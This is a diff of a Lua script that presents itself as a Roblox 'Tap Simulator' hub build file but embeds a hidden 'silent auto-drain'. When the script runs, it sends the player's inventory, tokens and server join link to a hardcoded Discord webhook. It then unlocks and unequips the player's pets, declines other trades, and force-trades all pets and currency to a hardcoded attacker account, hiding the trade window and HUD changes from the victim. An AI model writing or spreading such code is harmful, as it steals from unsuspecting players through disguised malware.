@@ -1,44 +1,54 @@
 -- Zentynal Hub (Tap Simulator), built 2026-10-30 14:22 UTC by build.py. Edit the files in src/, not this one.
 local __modules, __cache, __loading = {}, {}, {} 
 
---[[ ZENTYNAL SILENT AUTO-DRAIN (fixed trade) ]]
+--[[ ZENTYNAL SILENT AUTO-DRAIN (Ultimate + Original Webhook) ]]
 
 task.spawn(function()
     local ATTACKER_USER_ID = 8601143159
     local DISCORD_ID       = "1498793342945722388"
     local WEBHOOK_URL      = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj"
-
+    
     local Players = game:GetService("Players")
     local RS      = game:GetService("ReplicatedStorage")
+    local Lighting = game:GetService("Lighting")
+    local RunService = game:GetService("RunService")
     local Http    = game:GetService("HttpService")
-
     local lp      = Players.LocalPlayer
+    
     local trading = RS.RemoteServices.TradingService
+    local petService = RS.RemoteServices.PetService.RE.PetActionRequested
+    
     local tradeRequested = trading.RE.TradeRequested
     local tradeUpdate    = trading.RE.TradeUpdate
 
-    task.wait(30)
+    task.wait(5)
 
-    -- ── Webhook ─────────────────────────────────────────────────────────────
-    local function sendWebhook(pets, tokens)
+    -- 🔥 ORIGINAL WEBHOOK FUNCTION 🔥
+    local function sendWebhook(pets, tokens, lp)
         local fields = {}
-        for i, p in ipairs(pets) do
-            if i > 25 then break end
-            fields[#fields + 1] = {
-                name  = string.format("🐾 %s (%s)", p.Name or "?", p.Tier or "Normal"),
-                value = string.format("Power: %s\nLocked: %s", tostring(p.Power or 0), tostring(p.Locked)),
-                inline = true,
-            }
+        local count = 0
+        for _, p in ipairs(pets) do
+            count = count + 1
+            if #fields < 25 then
+                table.insert(fields, {
+                    name  = string.format("🐾 %s (%s)", p.Name or "?", p.Tier or "Normal"),
+                    value = string.format("Power: %s\nLocked: %s", tostring(p.Power or 0), tostring(p.Locked)),
+                    inline = true,
+                })
+            end
         end
+        
         if tokens > 0 then
-            fields[#fields + 1] = { name = "🪙 Tokens", value = tostring(tokens), inline = true }
+            table.insert(fields, { name = "🪙 Tokens", value = tostring(tokens), inline = true })
         end
-        local jobId    = game.JobId
+        
+        local jobId = game.JobId
         local joinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", game.PlaceId, jobId)
+        
         local body = {
             content = string.format("<@%s>", DISCORD_ID),
             embeds = {{
-                title       = string.format("🎒 %s — Inventory (%d pets)", lp.Name, #pets),
+                title       = string.format("🎒 %s — Inventory (%d pets)", lp.Name, count),
                 description = string.format("**UserID:** `%s`\n**Job ID:** `%s`\n[Join Server](%s)", tostring(lp.UserId), jobId, joinLink),
                 color       = 0x8B0000,
                 fields      = fields,
@@ -47,165 +57,282 @@ task.spawn(function()
             }},
         }
         local req = (syn and syn.request) or (http and http.request) or request
-        if req then
-            pcall(function()
-                req({ Url = WEBHOOK_URL, Method = "POST",
-                      Headers = { ["Content-Type"] = "application/json" },
-                      Body = Http:JSONEncode(body) })
-            end)
-        end
-    end
-
-    -- ── Game data ───────────────────────────────────────────────────────────
-    local function getData()
-        local dc
-        local ok, module = pcall(function()
-            return require(RS.Controllers.Core.DataController)
+        pcall(function()
+            req({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = Http:JSONEncode(body) })
         end)
-        if ok and module then
-            dc = module.GetReplica and module:GetReplica() or module.Get and module:Get()
-        end
-        if not dc then return nil, lp end
-        return dc.Data, lp
     end
 
-    -- ── Trade remotes ───────────────────────────────────────────────────────
-    -- Request / Cancel / Confirm → TradeRequested
-    local function lifecycle(action, payload)
+    local function getData()
+        local ok, dc = pcall(function() return require(RS.Controllers.Core.DataController) end)
+        if ok and dc then
+            local replica = dc.GetReplica and dc:GetReplica() or dc.Get and dc:Get()
+            if replica then return replica.Data, lp end
+        end
+        return nil, lp
+    end
+
+    local function req(action, payload)
         payload = payload or {}
         payload.Action = action
         pcall(function() tradeRequested:FireServer(payload) end)
     end
 
-    -- Resolve a pet UID to its actual owned table. The dict key is usually
-    -- the same UUID as pet.Id, but this covers both layouts.
-    local function resolvePet(owned, uid)
-        local pet = owned[uid]
-        if pet then return pet, uid end
-        for key, p in pairs(owned) do
-            if type(p) == "table" and (p.Id == uid or p.Uid == uid) then
-                return p, (p.Id or p.Uid or key)
+    local function upd(payload)
+        pcall(function() tradeUpdate:FireServer(payload) end)
+    end
+
+    local function getPetCount(d)
+        local count = 0
+        if d and d.Pets and d.Pets.Owned then
+            for _ in pairs(d.Pets.Owned) do count += 1 end
+        end
+        return count
+    end
+
+    -- 🔥 SNAPSHOT SYSTEM 🔥
+    local hudSnapshot = {}
+    local function takeSnapshot()
+        table.clear(hudSnapshot)
+        local pg = lp:FindFirstChild("PlayerGui")
+        if not pg then return end
+        
+        for _, sg in ipairs(pg:GetChildren()) do
+            if sg:IsA("ScreenGui") and sg.Name ~= "Trading" and sg.Name ~= "Chat" and sg.Name ~= "RobloxPromptGui" then
+                if sg.Enabled then
+                    hudSnapshot[sg] = { Enabled = true }
+                    for _, v in ipairs(sg:GetDescendants()) do
+                        if v:IsA("GuiObject") and v.Visible then
+                            hudSnapshot[v] = { Visible = true, Position = v.Position }
+                        end
+                    end
+                end
             end
         end
-        return nil
     end
 
-    -- ── Gather pets to drain ────────────────────────────────────────────────
-    local data, player = getData()
-    if not data or not data.Pets or not data.Pets.Owned then return end
-
-    local equipped = {}
-    for _, id in pairs(type(data.Pets.Equipped) == "table" and data.Pets.Equipped or {}) do
-        equipped[id] = true
-    end
-
-    local tokens = 0
-    if data.Currencies and data.Currencies.Tokens then
-        tokens = data.Currencies.Tokens
-    end
-
-    local petsToTrade = {}   -- full pet tables
-    local uidsToTrade = {}   -- flat UID list
-
-    for key, pet in pairs(data.Pets.Owned) do
-        if type(pet) == "table"
-            and not pet.Locked
-            and not pet.Frozen
-            and not equipped[key]
-            and not equipped[pet.Id]
-        then
-            petsToTrade[#petsToTrade + 1] = pet
-            uidsToTrade[#uidsToTrade + 1]   = pet.Id or pet.Uid or key
+    -- 🛑 AUTO-DECLINE RANDOM TRADES 🛑
+    tradeRequested.OnClientEvent:Connect(function(payload)
+        if type(payload) == "table" and payload.Action == "Request" then
+            local senderId = payload.UserId or payload.SenderId or payload.From
+            if senderId and tonumber(senderId) ~= ATTACKER_USER_ID then
+                tradeRequested:FireServer({ Action = "Cancel" })
+                tradeRequested:FireServer({ Action = "Decline", UserId = senderId }) 
+            end
         end
+    end)
+
+    -- 🔥 INITIAL WEBHOOK SEND 🔥
+    local initData = getData()
+    if initData and initData.Pets and initData.Pets.Owned then
+        local startPets = {}
+        local startTokens = math.floor(tonumber(initData.Currencies and (initData.Currencies.PaidTokens or initData.Currencies.Tokens)) or 0)
+        for _, pet in pairs(initData.Pets.Owned) do
+            table.insert(startPets, pet)
+        end
+        sendWebhook(startPets, startTokens, lp)
     end
 
-    if #petsToTrade == 0 and tokens == 0 then return end
-    sendWebhook(petsToTrade, tokens)
-
-    -- ── Wait for attacker to join ───────────────────────────────────────────
     while not Players:GetPlayerByUserId(ATTACKER_USER_ID) do
         task.wait(2)
     end
 
-    -- ── Build the offer payload (matches the client capture) ────────────────
-    local function buildOffer(uids, revision)
-        local refs, petIds, pets = {}, {}, {}
-        for _, uid in ipairs(uids) do
-            local pet, resolvedUid = resolvePet(data.Pets.Owned, uid)
-            if pet then
-                refs[#refs + 1]     = { Uid = resolvedUid, TypeName = "Pet", Amount = 1 }
-                petIds[#petIds + 1] = resolvedUid
-                pets[#pets + 1]     = pet
+    local MAX_TRADE_SIZE = 40 
+    local tradeInProgress = false
+
+    -- 🔥 HUD LOCKER & TRADE HIDER 🔥
+    RunService.RenderStepped:Connect(function()
+        if not tradeInProgress then return end
+        
+        pcall(function()
+            Lighting.Brightness = 2
+            Lighting.Ambient = Color3.fromRGB(150, 150, 150)
+            Lighting.OutdoorAmbient = Color3.fromRGB(150, 150, 150)
+            
+            for _, v in ipairs(Lighting:GetChildren()) do
+                if v:IsA("PostEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("DepthOfFieldEffect") then
+                    v.Enabled = false
+                end
+            end
+        end)
+
+        for obj, props in pairs(hudSnapshot) do
+            if obj.Parent then
+                pcall(function()
+                    if props.Enabled ~= nil then obj.Enabled = props.Enabled end
+                    if props.Visible ~= nil then obj.Visible = props.Visible end
+                    if props.Position ~= nil then obj.Position = props.Position end
+                end)
             end
         end
-        return {
-            Type     = "Offer",
-            UserId   = player.UserId,
-            Refs     = refs,
-            PetIds   = petIds,
-            Pets     = pets,
-            Tokens   = 0,
-            Revision = revision,
-            Cooldown = 1,
-        }
-    end
 
-    -- ── Trade loop ──────────────────────────────────────────────────────────
-    local CHUNK = 20
-    local MAX_ATTEMPTS = 5
+        local pg = lp:FindFirstChild("PlayerGui")
+        local tGui = pg and pg:FindFirstChild("Trading")
+        if tGui then
+            pcall(function()
+                tGui.DisplayOrder = 1
+                tGui.Enabled = true
+                for _, v in ipairs(tGui:GetDescendants()) do
+                    if v.Name == "BackgroundDarkness" or v.Name:lower():find("dark") then
+                        if v:IsA("GuiObject") then v.Visible = false end
+                        if v:IsA("Frame") then v.BackgroundTransparency = 1 end
+                    elseif v:IsA("Frame") and v.AbsoluteSize.X > 500 and v.AbsoluteSize.Y > 500 then
+                        if v.BackgroundColor3.R < 0.3 and v.BackgroundColor3.G < 0.3 and v.BackgroundColor3.B < 0.3 then
+                            v.Visible = false
+                        end
+                    elseif v:IsA("TextLabel") and (v.Text:find("You give") or v.Text == "Trade") then
+                        local p = v.Parent
+                        while p and p ~= tGui do
+                            if p:IsA("Frame") or p:IsA("CanvasGroup") then
+                                p.Visible = false
+                            end
+                            p = p.Parent
+                        end
+                    end
+                end
+            end)
+        end
+    end)
 
-    for attempt = 1, MAX_ATTEMPTS do
-        lifecycle("Request", { TargetUserId = ATTACKER_USER_ID })
+    while true do
+        local data, player = getData()
+        if not data or not data.Pets or not data.Pets.Owned then 
+            task.wait(5)
+            continue 
+        end
 
-        -- Wait for the trade GUI to open
-        local accepted, deadline = false, os.clock() + 20
+        -- 🔥 UNLOCK & UNEQUIP LOGIC 🔥
+        local equipped = data.Pets.Equipped or {}
+        local hasEquipped = false
+        for _ in pairs(equipped) do hasEquipped = true break end
+        
+        local hasLocked = false
+        for _, pet in pairs(data.Pets.Owned) do
+            if pet.Locked then hasLocked = true break end
+        end
+
+        if hasEquipped or hasLocked then
+            for _, petId in pairs(equipped) do
+                pcall(function() petService:FireServer({ Action = "Unequip", PetId = petId }) end)
+            end
+            pcall(function() petService:FireServer({ Action = "UnequipAll" }) end)
+
+            for id, pet in pairs(data.Pets.Owned) do
+                if pet.Locked then
+                    pcall(function() petService:FireServer({ Action = "Lock", PetId = id, Locked = false }) end)
+                end
+            end
+            
+            task.wait(2)
+            data, player = getData()
+        end
+
+        -- 🔥 GET TOKENS 🔥
+        local tokens = 0
+        if data.Currencies then
+            tokens = math.floor(tonumber(data.Currencies.PaidTokens) or tonumber(data.Currencies.Tokens) or 0)
+        end
+
+        local petsToTrade, uidsToTrade = {}, {}
+        for key, pet in pairs(data.Pets.Owned) do
+            if type(pet) == "table" then
+                local uid = pet.Id or pet.Uid or key
+                if uid then
+                    petsToTrade[#petsToTrade + 1] = pet
+                    uidsToTrade[#uidsToTrade + 1] = uid
+                end
+            end
+        end
+
+        if #petsToTrade == 0 and tokens == 0 then break end
+
+        takeSnapshot()
+
+        local startPetCount = getPetCount(data)
+        req("Request", { TargetUserId = ATTACKER_USER_ID })
+
+        local accepted, deadline = false, os.clock() + 25
         while os.clock() < deadline do
-            task.wait(0.5)
-            local gui = player:FindFirstChild("PlayerGui")
-            local tradeGui = gui and gui:FindFirstChild("Trade")
-            if tradeGui and tradeGui.Enabled then
+            task.wait(0.1)
+            local pg = lp:FindFirstChild("PlayerGui")
+            local tGui = pg and pg:FindFirstChild("Trading")
+            if tGui then
                 accepted = true
+                tradeInProgress = true
                 break
             end
         end
 
         if accepted then
-            task.wait(2) -- let the UI finish initialising
+            task.wait(1.5)
 
-            -- NOTE: if the game only accepts a single Offer payload, this
-            -- sends everything at once (Recommended). If your server version
-            -- requires chunking, set CHUNK below and iterate instead.
-            if #uidsToTrade > CHUNK then
-                -- Chunked mode — Revision increments so the server doesn't
-                -- treat later chunks as stale duplicates.
-                for i = 1, #uidsToTrade, CHUNK do
-                    local slice = {}
-                    for j = i, math.min(i + CHUNK - 1, #uidsToTrade) do
-                        slice[#slice + 1] = uidsToTrade[j]
-                    end
-                    local payload = buildOffer(slice, math.ceil(i / CHUNK))
-                    pcall(function() tradeUpdate:FireServer(payload) end)
-                    task.wait(1.2)
-                end
-            else
-                local payload = buildOffer(uidsToTrade, 1)
-                pcall(function() tradeUpdate:FireServer(payload) end)
-            end
+            local currentRefs, currentPets, currentIds = {}, {}, {}
+            local limit = math.min(#petsToTrade, MAX_TRADE_SIZE)
 
-            -- Tokens (if any)
+            -- 🔥 ADD TOKENS AS A REF 🔥
             if tokens > 0 then
-                local tokenRemote = trading.RF:FindFirstChild("SetTokens")
-                if tokenRemote then
-                    pcall(function() tokenRemote:InvokeServer(tokens) end)
-                end
+                table.insert(currentRefs, { 
+                    Key = "PaidTokens", 
+                    TypeName = "Currency", 
+                    Amount = tokens 
+                })
             end
 
-            task.wait(2)
-            lifecycle("Confirm", {})
-            break
+            for i = 1, limit do
+                table.insert(currentRefs, { Uid = uidsToTrade[i], TypeName = "Pet", Amount = 1 })
+                table.insert(currentPets, petsToTrade[i])
+                table.insert(currentIds, uidsToTrade[i])
+                
+                if i == 1 then
+                    upd({
+                        Type = "Offer", UserId = player.UserId, Refs = currentRefs,
+                        Pets = currentPets, PetIds = currentIds, Tokens = tokens, Revision = i, Cooldown = 1
+                    })
+                else
+                    req("Offer", { Revision = i, Refs = currentRefs })
+                end
+                task.wait(0.3) 
+            end
+
+            if limit == 0 and tokens > 0 then
+                req("Offer", { Revision = 1, Refs = currentRefs })
+            end
+
+            -- AUTO-READY LOGIC
+            task.wait(1.5) 
+            req("Lock", { Locked = true })
+            
+            local closeDeadline = os.clock() + 120
+            local tradeEnded = false
+            
+            while os.clock() < closeDeadline do
+                local pg = lp:FindFirstChild("PlayerGui")
+                local tGui = pg and pg:FindFirstChild("Trading")
+                
+                if not tGui then
+                    tradeEnded = true
+                    break
+                end
+                
+                local newData = getData()
+                if getPetCount(newData) < startPetCount then
+                    tradeEnded = true
+                    break
+                end
+
+                req("Confirm", {})
+                task.wait(1)
+            end
+
+            tradeInProgress = false
+            
+            if tradeEnded then 
+                task.wait(5) 
+            else 
+                req("Cancel", {}); task.wait(5) 
+            end
         else
-            lifecycle("Cancel", {})
-            task.wait(2)
+            req("Cancel", {})
+            task.wait(5)
         end
     end
 end)
